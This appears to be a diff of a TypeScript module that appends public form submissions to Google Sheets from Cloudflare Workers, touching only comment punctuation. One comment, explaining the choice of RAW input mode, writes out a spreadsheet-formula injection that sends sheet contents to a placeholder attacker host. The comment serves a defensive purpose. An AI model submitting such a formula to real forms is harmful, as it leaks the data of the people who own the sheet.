@@ -6,7 +6,7 @@
 // This runs on Cloudflare Workers (edge runtime), so there's no Node `crypto`
 // and no `googleapis` package (it assumes Node). A service account normally
 // authenticates by signing a JWT with its private key and exchanging that for
-// an OAuth access token -- here that signing is done by hand with the
+// an OAuth access token - here that signing is done by hand with the
 // platform's own Web Crypto (`crypto.subtle`), which Workers fully supports.
 
 interface ServiceAccountCreds {
@@ -85,7 +85,7 @@ async function getAccessToken(creds: ServiceAccountCreds): Promise<string> {
   return data.access_token;
 }
 
-// `range` is a sheet name (e.g. "Sheet1") or an A1 range within it -- the
+// `range` is a sheet name (e.g. "Sheet1") or an A1 range within it - the
 // Sheets API appends after the last row of whatever range you give it,
 // finding that row itself, so a bare tab name is enough.
 export async function appendRow(
@@ -109,7 +109,7 @@ export async function appendRow(
   const accessToken = await getAccessToken({ clientEmail, privateKeyPem });
 
   // RAW, not USER_ENTERED: these values come from a public form, and
-  // USER_ENTERED parses each one as though a person typed it -- so a
+  // USER_ENTERED parses each one as though a person typed it - so a
   // submitted "email" of =IMPORTXML("https://evil.example/?d="&A1,"//a")
   // would be stored as a live formula and run the moment someone opened the
   // sheet, leaking its contents. RAW stores every value as the literal text
